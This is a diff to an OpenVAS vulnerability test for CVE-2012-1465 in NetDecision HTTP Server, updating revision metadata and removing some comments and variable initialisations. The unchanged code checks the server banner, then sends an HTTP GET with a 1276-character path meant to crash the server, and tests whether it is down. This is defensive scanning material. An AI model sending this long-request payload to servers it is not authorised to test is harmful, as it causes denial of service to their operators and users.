@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_netdecision_http_server_long_req_dos_vuln.nasl 6697 2017-07-12 11:40:05Z cfischer $
+# $Id: gb_netdecision_http_server_long_req_dos_vuln.nasl 11301 2018-09-10 11:24:56Z asteins $
 #
 # NetDecision HTTP Server Long HTTP Request Remote Denial of Service Vulnerability
 #
@@ -28,11 +28,11 @@ if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.802617");
   script_bugtraq_id(52208);
-  script_version("$Revision: 6697 $");
+  script_version("$Revision: 11301 $");
   script_cve_id("CVE-2012-1465");
   script_tag(name:"cvss_base", value:"4.3");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:N/A:P");
-  script_tag(name:"last_modification", value:"$Date: 2017-07-12 13:40:05 +0200 (Wed, 12 Jul 2017) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-09-10 13:24:56 +0200 (Mon, 10 Sep 2018) $");
   script_tag(name:"creation_date", value:"2012-03-08 15:19:34 +0530 (Thu, 08 Mar 2012)");
   script_name("NetDecision HTTP Server Long HTTP Request Remote Denial of Service Vulnerability");
 
@@ -72,29 +72,19 @@ if(description)
 
 include("http_func.inc");
 
-## Variable Initialization
-req = "";
-res = "";
-port = 0;
-banner = "";
-
-## Get HTTP Port
 port = get_http_port(default:80);
 
-## Confirm the application before trying exploit
 banner = get_http_banner(port: port);
 if(!banner || "Server: NetDecision-HTTP-Server" >!< banner){
   exit(0);
 }
 
-## Construct attack request
 req = http_get(item:string("/",crap(1276)), port:port);
 
 ## Send crafted request
 res = http_send_recv(port:port, data:req);
 sleep(3);
 
-## Confirm NetDecision HTTP Server is dead
 if(http_is_dead(port:port)){
   security_message(port:port);
   exit(0);
